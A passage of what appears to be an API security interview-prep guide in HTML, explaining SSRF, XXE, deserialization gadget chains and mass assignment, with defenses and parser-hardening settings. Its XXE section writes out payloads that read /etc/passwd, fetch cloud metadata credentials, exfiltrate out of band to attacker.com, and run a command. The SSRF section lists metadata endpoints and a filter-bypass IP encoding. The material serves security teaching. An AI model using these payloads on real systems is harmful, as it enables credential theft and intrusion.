+  <!-- Q3 -->
+  <article class="q red" id="q3">
+    <div class="q-head">
+      <div class="q-num">3</div>
+      <h3>What is SSRF, and how does it extend beyond the webhook case?</h3>
+    </div>
+    <div class="q-body">
+      <div class="callout answer">
+        <span class="label">Short Answer</span>
+        <p>Server-Side Request Forgery is the attack where a client-supplied URL is fetched by the server,
+        reaching destinations the client cannot reach directly. The webhook case (Volume 11, Question 8) is
+        one; the others are <strong>image imports</strong>, <strong>URL previews</strong>,
+        <strong>file fetches</strong>, <strong>web scrapers</strong>, <strong>PDF renderers</strong>,
+        <strong>webhook test buttons</strong>, and any feature where the server fetches a URL the client
+        provides. The defense is the same — validate the URL, resolve the DNS, reject private IPs, isolate
+        the network — but the attack surfaces are more numerous than teams realise.</p>
+      </div>
+
+      <h4>The SSRF attack pattern</h4>
+      <p>Any endpoint that takes a URL from the client and fetches it is a candidate. The attacker's goal:</p>
+      <ul>
+        <li><strong>Reach internal services</strong> — the admin panel, the database, the metadata endpoint.</li>
+        <li><strong>Read cloud credentials</strong> — <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>
+        returns AWS IAM credentials.</li>
+        <li><strong>Port scan</strong> — by observing which URLs respond quickly (open port) vs slowly
+        (filtered), the attacker maps the internal network.</li>
+        <li><strong>Bypass IP allowlists</strong> — the internal service trusts requests from the API server's
+        IP; the attacker uses the API server as a proxy.</li>
+        <li><strong>Access local files</strong> — with <code>file://</code>, if the fetcher supports it.</li>
+        <li><strong>Reach the cloud provider's metadata</strong> — on GCP, Azure, AWS, Alibaba, and others,
+        each has a metadata endpoint with a specific IP and header.</li>
+      </ul>
+
+      <h4>The common SSRF surfaces</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Feature</th><th>SSRF mechanism</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Webhook delivery</strong></td>
+              <td>POSTs to a client-supplied URL (Volume 11, Question 8)</td>
+            </tr>
+            <tr>
+              <td><strong>Image import from URL</strong></td>
+              <td>Downloads the image from a URL; the server reaches internal URLs</td>
+            </tr>
+            <tr>
+              <td><strong>URL preview / link unfurling</strong></td>
+              <td>Fetches the URL to extract OpenGraph metadata; reaches internal services</td>
+            </tr>
+            <tr>
+              <td><strong>Web scraper</strong></td>
+              <td>Fetches URLs on behalf of the user; the server is the proxy</td>
+            </tr>
+            <tr>
+              <td><strong>PDF renderer</strong></td>
+              <td>Renders HTML to PDF; the HTML references internal URLs</td>
+            </tr>
+            <tr>
+              <td><strong>RSS/feed reader</strong></td>
+              <td>Fetches feeds from user URLs</td>
+            </tr>
+            <tr>
+              <td><strong>OAuth/JWT issuer discovery</strong></td>
+              <td>Fetches the discovery document from a user-supplied issuer URL</td>
+            </tr>
+            <tr>
+              <td><strong>Webhook test button</strong></td>
+              <td>"Test this URL" fetches it immediately</td>
+            </tr>
+            <tr>
+              <td><strong>XML external entity (XXE) processing</strong></td>
+              <td>The XML parser fetches external entities (Question 4 — the XXE SSRF variant)</td>
+            </tr>
+            <tr>
+              <td><strong>SAML/OIDC metadata</strong></td>
+              <td>Fetches metadata from a configured URL</td>
+            </tr>
+            <tr>
+              <td><strong>Import from cloud storage</strong></td>
+              <td>If the URL is validated insufficiently, it can point to internal storage</td>
+            </tr>
+            <tr>
+              <td><strong>CI/CD pipeline</strong></td>
+              <td>If the pipeline fetches a URL from a PR or commit, the attacker controls it</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>The defenses — layered</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Layer</th><th>Defense</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>URL allowlist</strong></td>
+              <td>The strongest defense — only specific domains are allowed. Used for high-value integrations
+              where the destination is known.</td>
+            </tr>
+            <tr>
+              <td><strong>URL allowlist for file types</strong></td>
+              <td>Only <code>https</code>, only specific paths (e.g., S3 buckets), only specific hosts</td>
+            </tr>
+            <tr>
+              <td><strong>DNS resolution + IP validation</strong></td>
+              <td>Resolve the hostname; reject private, loopback, link-local, multicast, and reserved IPs</td>
+            </tr>
+            <tr>
+              <td><strong>Re-validate after resolution</strong></td>
+              <td>Avoid DNS rebinding — resolve, validate, pin the IP</td>
+            </tr>
+            <tr>
+              <td><strong>No redirects</strong></td>
+              <td>A 3xx response can redirect to an internal URL; disable following</td>
+            </tr>
+            <tr>
+              <td><strong>Egress firewall</strong></td>
+              <td>At the network level, deny outbound to RFC 1918 and metadata IPs; catches any application bug</td>
+            </tr>
+            <tr>
+              <td><strong>Network isolation</strong></td>
+              <td>The fetcher runs in a subnet with no route to internal services — the strongest defense</td>
+            </tr>
+            <tr>
+              <td><strong>Timeout and response size limit</strong></td>
+              <td>Prevent resource exhaustion; a slow or large response cannot hold a thread indefinitely</td>
+            </tr>
+            <tr>
+              <td><strong>Do not log the response body</strong></td>
+              <td>A malicious or internal-service response may leak information into logs</td>
+            </tr>
+            <tr>
+              <td><strong>Credentials isolation</strong></td>
+              <td>The fetcher's process should not have cloud credentials or database access — if SSRF succeeds,
+              it still cannot escalate</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>The DNS rebinding attack</h4>
+      <p>The attacker's domain resolves to a public IP when the URL is validated, then to an internal IP when
+      the actual fetch happens. The bypass: validate once, then fetch, and the two resolutions differ.</p>
+      <p>The defenses:</p>
+      <ul>
+        <li><strong>Re-validate every time</strong> — resolve the DNS, check the IP, then fetch using the
+        resolved IP, not the hostname. The pinned IP is what gets connected to.</li>
+        <li><strong>Use a resolver that refuses private IPs</strong> — some DNS resolvers (or a custom
+        resolver in your application) refuse to return private IPs.</li>
+        <li><strong>Egress filtering</strong> — the final backstop; even if the DNS resolves to an internal
+        IP, the network blocks the connection.</li>
+      </ul>
+
+      <h4>The cloud metadata endpoints</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Cloud</th><th>Endpoint</th><th>What it returns</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>AWS</td>
+              <td><code>http://169.254.169.254/latest/meta-data/</code></td>
+              <td>Instance metadata, IAM credentials</td>
+            </tr>
+            <tr>
+              <td>GCP</td>
+              <td><code>http://metadata.google.internal/</code></td>
+              <td>Service account tokens, project metadata (requires <code>Metadata-Flavor: Google</code> header)</td>
+            </tr>
+            <tr>
+              <td>Azure</td>
+              <td><code>http://169.254.169.254/metadata/</code></td>
+              <td>Managed identity tokens (requires <code>Metadata: true</code> header)</td>
+            </tr>
+            <tr>
+              <td>Alibaba Cloud</td>
+              <td><code>http://100.100.100.200/latest/meta-data/</code></td>
+              <td>Instance metadata, credentials</td>
+            </tr>
+            <tr>
+              <td>DigitalOcean</td>
+              <td><code>http://169.254.169.254/metadata/v1/</code></td>
+              <td>Instance metadata, user data</td>
+            </tr>
+            <tr>
+              <td>Oracle Cloud</td>
+              <td><code>http://169.254.169.254/opc/v1/</code></td>
+              <td>Instance metadata</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>SSRF to the metadata endpoint is the most damaging variant — it returns the credentials the
+      instance uses to access cloud services. In a compromised SSRF, the attacker can use those credentials
+      to access S3, RDS, SQS, and everything else the instance is authorized for. AWS mitigates this with
+      IMDSv2 (session-token requirement), which the metadata endpoint enforces — but IMDSv1 is still enabled
+      on many instances, and GCP/Azure have their own mitigations with varying defaults.</p>
+
+      <h4>The "it is internal, so it is trusted" trap</h4>
+      <p>A common assumption: "the internal service doesn't need auth because it is inside the network". SSRF
+      exploits exactly this assumption — the attacker uses the API server as a trusted caller to reach the
+      internal service, bypassing the network perimeter. This is why SSRF is a critical vulnerability in
+      zero-trust architectures: the internal service must verify every call, regardless of the source IP.</p>
+
+      <div class="callout pitfall">
+        <span class="label">Common Pitfall</span>
+        <p>Validating the URL by string matching — rejecting <code>169.254.169.254</code> in the input. The
+        attacker uses an IP encoding (<code>http://0251.0376.0251.0376/</code>), a redirect, a DNS rebinding,
+        or an IPv6 representation to bypass the check. The fix: resolve the DNS, validate the resolved IP,
+        and use the resolved IP for the request — not string matching.</p>
+      </div>
+
+      <div class="callout tip">
+        <span class="label">Interview Framing</span>
+        <p>Say: "SSRF is any URL the server fetches on the client's behalf — webhooks, image imports, URL
+        previews, PDF renderers. The attack targets internal services and cloud metadata. The defense is
+        layered: URL allowlist, DNS + IP validation, no redirects, egress firewall, network isolation, and no
+        credentials on the fetcher." That covers the surface and the layered defense.</p>
+      </div>
+    </div>
+  </article>
+
+  <!-- Q4 -->
+  <article class="q red" id="q4">
+    <div class="q-head">
+      <div class="q-num">4</div>
+      <h3>What is XXE, and what are the XML parsing traps that most teams miss?</h3>
+    </div>
+    <div class="q-body">
+      <div class="callout answer">
+        <span class="label">Short Answer</span>
+        <p>XML External Entity (XXE) is an attack where the XML parser is tricked into including external
+        entities — files from the server's filesystem, HTTP requests to internal services, or in some cases
+        remote code. The vulnerability is in the parser's default configuration: most XML parsers historically
+        supported external entities by default, and disabling them requires explicit configuration. Modern
+        APIs often process XML without realising it — SOAP, SAML, XML-RPC, RSS, SVG, DOCX/XLSX, and many
+        configuration formats.</p>
+      </div>
+
+      <h4>The attack</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Payload</th><th>Effect</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>
+                <pre>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</pre>
+              </td>
+              <td>The parser reads <code>/etc/passwd</code> and substitutes its content into <code>&amp;xxe;</code></td>
+            </tr>
+            <tr>
+              <td>
+                <pre>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</pre>
+              </td>
+              <td>SSRF — the parser fetches the cloud metadata endpoint and includes it</td>
+            </tr>
+            <tr>
+              <td>
+                <pre>&lt;!DOCTYPE foo [&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
+%dtd;]&gt;
+&lt;foo&gt;&amp;send;&lt;/foo&gt;</pre>
+              </td>
+              <td>Out-of-band exfiltration — the DTD at attacker.com receives the file content via a URL</td>
+            </tr>
+            <tr>
+              <td>
+                <pre>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "expect://id"&gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</pre>
+              </td>
+              <td>If the PHP <code>expect</code> extension is loaded — remote command execution</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The first payload reads a file. The second performs SSRF. The third exfiltrates data even when the
+      response is not returned to the attacker (out-of-band). The fourth, when the environment supports it,
+      executes a command.</p>
+
+      <h4>Where XXE appears</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Context</th><th>Why it matters</th></tr></thead>
+          <tbody>
+            <tr><td><strong>SOAP APIs</strong></td><td>XML is the payload format — the parser must be hardened</td></tr>
+            <tr><td><strong>SAML authentication</strong></td><td>SAML assertions are XML; XXE in the assertion parser</td></tr>
+            <tr><td><strong>XML-RPC</strong></td><td>Legacy but still deployed</td></tr>
+            <tr><td><strong>RSS/Atom feeds</strong></td><td>The server parses feeds from user-supplied URLs</td></tr>
+            <tr><td><strong>SVG images</strong></td><td>SVG is XML — image upload processors are vulnerable</td></tr>
+            <tr><td><strong>DOCX/XLSX files</strong></td><td>These are ZIPs containing XML — office document processors are vulnerable</td></tr>
+            <tr><td><strong>Configuration files</strong></td><td>XML configs, if the user controls them</td></tr>
+            <tr><td><strong>PDF generation</strong></td><td>Some PDF generators use XSLT, which can be XXE-vulnerable</td></tr>
+            <tr><td><strong>Build tools</strong></td><td>Maven <code>pom.xml</code>, Ant build scripts — if user-controlled, XXE</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The critical insight: XML parsing is often implicit. A library that parses SVG, DOCX, or a SOAP
+      envelope does XML parsing whether the developer thinks of it or not. The parser's defaults determine
+      whether XXE is possible.</p>
+
+      <h4>The defenses</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Defense</th><th>How</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Disable DTDs</strong></td>
+              <td>The definitive fix — reject any XML with a <code>DOCTYPE</code> declaration. No DTD, no
+              entities, no XXE.</td>
+            </tr>
+            <tr>
+              <td><strong>Disable external entities</strong></td>
+              <td>If DTDs must be allowed, disable <code>SYSTEM</code> and <code>PUBLIC</code> entities</td>
+            </tr>
+            <tr>
+              <td><strong>Disable external DTD loading</strong></td>
+              <td>Reject <code>http://</code>, <code>file://</code>, <code>ftp://</code> in DTD references</td>
+            </tr>
+            <tr>
+              <td><strong>Use a safe parser configuration</strong></td>
+              <td>Most languages have a "secure" or "hardened" parsing mode; use it by default</td>
+            </tr>
+            <tr>
+              <td><strong>Use JSON instead of XML</strong></td>
+              <td>If the API does not need XML, do not accept it — JSON has no equivalent to external entities</td>
+            </tr>
+            <tr>
+              <td><strong>WAF rule for <code>&lt;!DOCTYPE</code></strong></td>
+              <td>Block the payload pattern; catches naive attacks, misses encoded ones</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>The parser-specific configurations</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Language</th><th>What to disable</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Java (SAX/DOM)</strong></td>
+              <td><code>factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)</code>;
+              <code>setFeature("...external-general-entities", false)</code>;
+              <code>setFeature("...external-parameter-entities", false)</code></td>
+            </tr>
+            <tr>
+              <td><strong>Java (JAXB)</strong></td>
+              <td>Set <code>XMLInputFactory.SUPPORT_DTD</code> to <code>false</code>; disable external entities</td>
+            </tr>
+            <tr>
+              <td><strong>Python (lxml)</strong></td>
+              <td><code>XMLParser(resolve_entities=False, no_network=True)</code></td>
+            </tr>
+            <tr>
+              <td><strong>Python (ElementTree)</strong></td>
+              <td>Modern versions disable external entities; still validate input</td>
+            </tr>
+            <tr>
+              <td><strong>Node.js (libxmljs, xmldom)</strong></td>
+              <td>Configure to reject DTDs; validate parser settings</td>
+            </tr>
+            <tr>
+              <td><strong>.NET (XmlReader)</strong></td>
+              <td><code>DtdProcessing = DtdProcessing.Prohibit</code></td>
+            </tr>
+            <tr>
+              <td><strong>PHP</strong></td>
+              <td><code>libxml_disable_entity_loader(true)</code> (older PHP); modern PHP defaults are safer</td>
+            </tr>
+            <tr>
+              <td><strong>Go</strong></td>
+              <td><code>encoding/xml</code> does not expand external entities by default</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>The XXE-in-file-upload trap</h4>
+      <p>A common scenario: the API allows uploading an SVG for a user's profile picture. The SVG is XML; the
+      image processor parses it to validate or convert it. If the parser is not hardened, an SVG with a
+      DOCTYPE and external entity is an XXE.</p>
+      <p>Similarly for DOCX, XLSX, PPTX, and ODT — these are ZIP archives containing XML. If the API extracts
+      text or metadata, it parses the XML. The XXE is in the extracted XML, not the ZIP.</p>
+      <p>The defense: harden the XML parser in the file processor, or strip the DOCTYPE before parsing, or
+      reject any XML input with a DOCTYPE.</p>
+
+      <h4>The "we don't accept XML" misperception</h4>
+      <p>Teams often say "our API is JSON only". But the API may still parse XML in:</p>
+      <ul>
+        <li>A file upload (SVG, DOCX, XLSX)</li>
+        <li>A SOAP integration (for a legacy partner)</li>
+        <li>A SAML SSO flow</li>
+        <li>A webhook receiver (if the sender uses XML)</li>
+        <li>An internal service (if a dependency uses XML)</li>
+      </ul>
+      <p>The XXE is in the parser, not the API. Audit every XML parser in the stack — including library code,
+      not just the application code.</p>
+
+      <div class="callout pitfall">
+        <span class="label">Common Pitfall</span>
+        <p>Assuming the XML parser is safe because it is a well-known library. Many parsers have external
+        entities enabled by default, and libraries that parse XML (image processors, document converters,
+        SOAP libraries) may not have hardened defaults. Every parser must be explicitly configured to
+        disable DTDs and external entities — the safe default is not universal.</p>
+      </div>
+
+      <div class="callout tip">
+        <span class="label">Interview Framing</span>
+        <p>Say: "XXE is XML external entity — the parser reads files or fetches URLs. The fix is to disable
+        DTDs entirely, or at minimum disable external entities. Watch for the implicit XML — SVG uploads,
+        DOCX parsing, SAML assertions — where the developer did not realise XML was being parsed." That covers
+        the mechanism and the hidden surfaces.</p>
+      </div>
+    </div>
+  </article>
+
+  <!-- Q5 -->
+  <article class="q red" id="q5">
+    <div class="q-head">
+      <div class="q-num">5</div>
+      <h3>What are deserialization attacks, and how do you prevent them?</h3>
+    </div>
+    <div class="q-body">
+      <div class="callout answer">
+        <span class="label">Short Answer</span>
+        <p>Deserialization attacks exploit the process of converting untrusted bytes into an object. If the
+        attacker controls the bytes and the deserializer instantiates classes based on the input, the
+        attacker can construct an object graph that triggers code execution — often called a "gadget chain".
+        The vulnerable formats: Java serialization, PHP unserialize, Python pickle, Ruby Marshal, .NET
+        BinaryFormatter, and any format that encodes class names or method calls. The fix: <strong>never
+        deserialize untrusted data with a format that instantiates classes</strong>; use data-only formats
+        (JSON, Protobuf) with explicit schemas.</p>
+      </div>
+
+      <h4>The mechanism</h4>
+      <p>Object serialization formats often record the class of the object, its fields, and sometimes its
+      methods. When the deserializer reads the bytes, it instantiates the classes and calls their
+      constructors, setters, and read methods. If the attacker controls the bytes, they control which classes
+      are instantiated and with what values — and if any of those classes has a side effect (a read method
+      that executes a command, a constructor that opens a URL), the attacker can trigger it.</p>
+      <p>A "gadget chain" is a sequence of legitimate classes (from the application's dependencies) that,
+      when instantiated in sequence, produce code execution. The attacker finds a chain — one library's
+      readObject that calls another library's method with a controllable argument — and crafts the payload
+      to trigger it.</p>
+
+      <h4>The vulnerable formats</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Format</th><th>Vulnerability</th><th>Fix</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Java <code>ObjectInputStream</code></strong></td>
+              <td>Deserializes any class; gadget chains produce RCE</td>
+              <td>Use a serialization filter (<code>ObjectInputFilter</code>) with an allowlist of classes; or
+              do not use native serialization at all</td>
+            </tr>
+            <tr>
+              <td><strong>PHP <code>unserialize()</code></strong></td>
+              <td>Deserializes any class; magic methods (<code>__wakeup</code>, <code>__destruct</code>) trigger
+              code</td>
+              <td>Use <code>allowed_classes</code> option to allowlist classes; or use <code>json_decode</code></td>
+            </tr>
+            <tr>
+              <td><strong>Python <code>pickle</code></strong></td>
+              <td>Arbitrary code execution by design — pickle can call functions</td>
+              <td>Never unpickle untrusted data; use JSON or a typed format like Protobuf</td>
+            </tr>
+            <tr>
+              <td><strong>Ruby <code>Marshal.load</code></strong></td>
+              <td>Deserializes any object; gadget chains produce RCE</td>
+              <td>Use JSON; do not deserialize untrusted Marshal</td>
+            </tr>
+            <tr>
+              <td><strong>.NET <code>BinaryFormatter</code></strong></td>
+              <td>Deserializes any type; gadget chains produce RCE (deprecated in modern .NET)</td>
+              <td>Never use BinaryFormatter with untrusted data; migrate to JSON/Protobuf</td>
+            </tr>
+            <tr>
+              <td><strong>YAML <code>load()</code></strong></td>
+              <td>Python/Ruby YAML can instantiate arbitrary objects (unsafe loader)</td>
+              <td>Use <code>safe_load</code> (PyYAML), or explicit type registration</td>
+            </tr>
+            <tr>
+              <td><strong>XML with typed elements</strong></td>
+              <td>Some XML serializers instantiate classes by element name</td>
+              <td>Use explicit schema with allowlisted types</td>
+            </tr>
+            <tr>
+              <td><strong>Jackson with default typing</strong></td>
+              <td>If <code>enableDefaultTyping</code> is on, JSON can specify any class</td>
+              <td>Do not enable default typing; use explicit <code>@JsonTypeInfo</code> with an allowlist</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>The JSON "safe" misperception</h4>
+      <p>Teams often assume JSON is safe. It is — when deserialized with a data-only library (Jackson to a
+      known DTO, <code>json.loads</code> to a dict). It is not safe when:</p>
+      <ul>
+        <li><strong>Type information is embedded</strong> — a library that reads <code>"@class": "..."</code>
+        from the JSON and instantiates that class. Jackson's default typing is the classic example; it is
+        disabled by default in modern versions, but the flag is easy to re-enable.</li>
+        <li><strong>Polymorphic deserialization</strong> without an allowlist — a field of type
+        <code>Object</code> that gets whatever class the input specifies.</li>
+        <li><strong>The DTO has dangerous constructors</strong> — a DTO with a constructor that makes a network
+        call, or a field that gets set to a URL that is fetched.</li>
+      </ul>
+
+      <h4>The defenses</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Defense</th><th>How</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Use data-only formats</strong></td>
+              <td>JSON with explicit DTOs, Protobuf, MessagePack, or any format that cannot instantiate
+              arbitrary classes</td>
+            </tr>
+            <tr>
+              <td><strong>Allowlist classes</strong></td>
+              <td>If the format must support classes, restrict to a known set (Java's ObjectInputFilter,
+              PHP's <code>allowed_classes</code>)</td>
+            </tr>
+            <tr>
+              <td><strong>Disable polymorphic type info</strong></td>
+              <td>Jackson: disable default typing; use explicit <code>@JsonSubTypes</code> with named types</td>
+            </tr>
+            <tr>
+              <td><strong>Validate after deserialization</strong></td>
+              <td>The DTO is validated like any other input; but do not rely on this — the vulnerability is in
+              the deserialization itself</td>
+            </tr>
+            <tr>
+              <td><strong>Network isolation</strong></td>
+              <td>If deserialization succeeds despite defenses, the process cannot reach internal services or
+              cloud credentials</td>
+            </tr>
+            <tr>
+              <td><strong>Least-privilege process</strong></td>
+              <td>The deserializer runs with the minimum permissions; limits the damage of a successful attack</td>
+            </tr>
+            <tr>
+              <td><strong>Dependency scanning</strong></td>
+              <td>Scan for known gadget chains in dependencies (e.g., <code>ysoserial</code> payloads)</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>The "internal only" trap</h4>
+      <p>Teams often assume deserialization is safe "because it is only used between internal services". But
+      internal services are not trusted — a compromised service, a misconfigured proxy, a shared queue, or a
+      malicious internal actor can all inject data. The zero-trust rule applies: no deserializer sees
+      untrusted input without the defenses.</p>
+
+      <h4>The supply chain dimension</h4>
+      <p>Deserialization gadgets are often in third-party libraries — Apache Commons Collections, Spring,
+      Groovy, and dozens of others. The gadget exists because the library has a class with a dangerous read
+      method. Even if the application code is safe, an old version of a dependency can be the gadget.</p>
+      <p>The defense: keep dependencies updated, scan for known gadgets (Snyk, Dependabot, OWASP Dependency
+      Check), and — critically — do not use native serialization anywhere in the stack.</p>
+
+      <h4>The safe alternative</h4>
+      <p>The simplest defense: <strong>do not use serialization formats that instantiate classes</strong>. Use
+      JSON with explicit DTOs. Use Protobuf with a schema. Use MessagePack with a schema. These formats carry
+      data, not code, and the deserializer cannot be tricked into instantiating an arbitrary class. The
+      deserialization attack surface is eliminated, not mitigated.</p>
+
+      <div class="callout pitfall">
+        <span class="label">Common Pitfall</span>
+        <p>Enabling Jackson's default typing to support polymorphic deserialization. It is a convenience
+        feature — the JSON specifies the class, and Jackson instantiates it. It is also a deserialization
+        gadget vulnerability if the classpath has any dangerous class. The fix: use explicit
+        <code>@JsonTypeInfo</code> with an allowlisted set of subtypes, or do not use polymorphic
+        deserialization at all.</p>
+      </div>
+
+      <div class="callout tip">
+        <span class="label">Interview Framing</span>
+        <p>Say: "Deserialization attacks exploit formats that instantiate classes — Java serialization, PHP
+        unserialize, Python pickle. The gadget chain uses the application's own dependencies to produce RCE.
+        The fix is to never deserialize untrusted data with those formats — use JSON with explicit DTOs or
+        Protobuf. And remember: the gadget is often in a third-party library, not the application." That covers
+        the mechanism and the defense.</p>
+      </div>
+    </div>
+  </article>
+
+  <!-- ================= PART C ================= -->
+  <div class="part-band teal">
+    <div class="bar"></div>
+    <h2>Part C — Exposure, Logic &amp; Testing
+      <span class="sub">Mass assignment, enumeration, races, and CI security</span>
+    </h2>
+  </div>
+
+  <!-- Q6 -->
+  <article class="q teal" id="q6">
+    <div class="q-head">
+      <div class="q-num">6</div>
+      <h3>What is mass assignment, and how does it differ from excessive data exposure?</h3>
+    </div>
+    <div class="q-body">
+      <div class="callout answer">
+        <span class="label">Short Answer</span>
+        <p><strong>Mass assignment</strong> is accepting more fields than the client should control — the client
+        sends <code>{"is_admin": true}</code> and the server sets it. <strong>Excessive data exposure</strong>
+        is returning more fields than the client should see — the response includes <code>password_hash</code>,
+        <code>internal_notes</code>, or another user's PII. Both are API3 (Broken Object Property Level
+        Authorization), and both are the same root cause: the API maps the database model directly to the
+        request or the response instead of projecting through an explicit DTO.</p>
+      </div>
+
+      <h4>Mass assignment — the input side</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Client sends</th><th>Server behaviour</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>{"email": "a@b.com", "password": "..."}</code></td>
+              <td>Legitimate signup — set email and password</td>
+            </tr>
+            <tr>
+              <td><code>{"email": "a@b.com", "password": "...", "is_admin": true}</code></td>
+              <td>Privilege escalation — the user becomes admin</td>
+            </tr>
+            <tr>
+              <td><code>{"email": "a@b.com", "password": "...", "role": "owner"}</code></td>
+              <td>The user grants themselves a higher role</td>
+            </tr>
+            <tr>
+              <td><code>{"email": "a@b.com", "password": "...", "verified": true}</code></td>
+              <td>The user bypasses email verification</td>
+            </tr>
+            <tr>
+              <td><code>{"email": "a@b.com", "password": "...", "balance": 10000}</code></td>
+              <td>The user credits their own account</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The vulnerable implementation maps the request body directly to the model:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Language</th><th>Vulnerable code</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>Node.js (Mongoose)</td>
+              <td><code>const user = new User(req.body); await user.save();</code></td>
+            </tr>
+            <tr>
+              <td>Java (Spring)</td>
+              <td><code>@ModelAttribute User user</code> or Jackson with <code>ObjectMapper.readValue(body, User.class)</code> — if <code>User</code> has the field, it is set</td>
+            </tr>
+            <tr>
+              <td>Python (Django)</td>
+              <td><code>User.objects.create(**request.data)</code></td>
+            </tr>
+            <tr>
+              <td>Ruby on Rails</td>
+              <td><code>User.new(params)</code> — pre-strong-parameters</td>
+            </tr>
+            <tr>
+              <td>PHP (Laravel)</td>
+              <td><code>User::create($request->all())</code> — if <code>$fillable</code> is unset</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The defenses:</p>
+      <ul>
+        <li><strong>Explicit DTO for the request.</strong> A class with only the fields the client may set. The
+        body is deserialized into the DTO, and the DTO is copied to the model field by field.</li>
+        <li><strong>Allowlist of writable fields.</strong> The framework-level equivalent — Rails' strong
+        parameters, Laravel's <code>$fillable</code>, Django's <code>fields</code> in a serializer. These
+        exist for exactly this reason; use them.</li>
+        <li><strong>Never use <code>Object.assign</code>, <code>req.body</code> directly, or a reflection-based
+        mapper without an allowlist.</strong> These are the mechanisms that propagate the vulnerability.</li>
+        <li><strong>Explicitly mark read-only fields.</strong> <code>id</code>, <code>created_at</code>,
+        <code>role</code>, <code>is_admin</code>, <code>balance</code> — fields the client must never set.</li>
+      </ul>
+
+      <h4>Excessive data exposure — the output side</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Response field</th><th>Why it is a bug</th></tr></thead>
+          <tbody>
+            <tr><td><code>password_hash</code></td><td>The hash is sensitive — offline cracking</td></tr>
+            <tr><td><code>internal_notes</code></td><td>Support notes that should be internal</td></tr>
+            <tr><td><code>email</code> on another user's profile</td><td>PII that should be hidden from other users</td></tr>
+            <tr><td><code>ssn</code>, <code>dob</code></td><td>PII that is regulated (GDPR, HIPAA, PCI)</td></tr>
+            <tr><td><code>admin_flags</code>, <code>role</code></td><td>Reveals internal structure to the client</td></tr>
+            <tr><td><code>internal_id</code></td><td>Not sensitive by itself, but useful for enumeration and audit correlation</td></tr>
+            <tr><td><code>api_token</code>, <code>secret</code></td><td>Obvious — but still appears in returned models that include the field</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The vulnerable implementation serializes the model directly:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Language</th><th>Vulnerable code</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>Node.js (Express)</td>
+              <td><code>res.json(user)</code> — the whole Mongoose document, including every field</td>
+            </tr>
+            <tr>
+              <td>Java (Spring)</td>
+              <td>Returning the JPA entity directly from the controller</td>
+            </tr>
+            <tr>
+              <td>Python (Django)</td>
+              <td><code>serializers.ModelSerializer</code> with <code>fields = '__all__'</code></td>
+            </tr>
+            <tr>
+              <td>Ruby on Rails</td>
+              <td><code>render json: user</code> — includes every column</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The defenses:</p>
+      <ul>
+        <li><strong>Explicit response DTO.</strong> A class with only the fields the client should see. The
+        model is copied to the DTO field by field.</li>
+        <li><strong>Allowlist of serializable fields.</strong> Rails' <code>serializable_hash</code> with
+        <code>only:</code>, Django's <code>fields</code> list, Laravel's API Resources, Jackson's
+        <code>@JsonView</code>.</li>
+        <li><strong>Never serialize the ORM entity directly.</strong> The entity is the database shape; the
+        response is the API shape; they are not the same.</li>
+        <li><strong>Separate DTO per view.</strong> The list response has fewer fields than the detail
+        response; the public response has fewer than the admin response.</li>
+      </ul>
+
+      <h4>Why both are API3</h4>
+      <p>Both are about <em>property-level</em> authorization — the client can access a property it should not.
+      Mass assignment is write access; excessive exposure is read access. They share the fix: an explicit
+      boundary between the model and the API, with only the allowed properties crossing the boundary.</p>
+
+      <h4>The framework trap</h4>
+      <p>Many frameworks make mass assignment easy because it is convenient: <code>User.create(req.body)</code>
+      is shorter than defining a DTO. The convenience is the vulnerability. The strong-parameters pattern
+      (Rails, Laravel, Django) exists because the industry learned this lesson — but teams that skip the
